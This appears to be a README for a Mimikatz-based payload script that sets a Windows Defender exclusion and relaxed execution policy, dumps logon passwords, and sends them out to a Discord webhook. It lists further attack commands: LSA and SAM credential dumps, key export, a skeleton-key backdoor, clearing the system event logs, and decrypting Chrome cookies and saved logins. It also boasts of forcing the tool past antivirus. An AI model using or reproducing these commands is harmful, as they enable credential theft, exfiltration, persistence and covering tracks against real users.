# usage
Place discord webhook into the correct variable in the Mimikatz.txt file, and that's it!

# To know 
this script sets an exclusion path on C:\temp, then removes such and the execution policy back to normal when completed.

# Exfiltration
Mimikatz is a very useful utility for pentesters, so change the commands to ones needs. 
- for now sekurlsa::logonpasswords is exfiltrated and saved to the logs, add more if needed 

# examples for additions
Extract from lsass (service)
- lsadump::lsa /inject

Extract from SAM
- lsadump::sam

print list of provider keys
- crypto::keys /export

skeleton key
- misc::skeleton

event logs
- event::clear
- event::clear /log:system

Chrome Cookies
- dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect

Chrome Logins
- dpapi::chrome /in:"C:\Users\\%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data" 

# Note
Script does not bypass av, we force it
- mimikatz is flagged after the powershell process is finished from heuristics
# Mimikatz payload credits
https://github.com/HernanRodriguez1/MimikatzFUD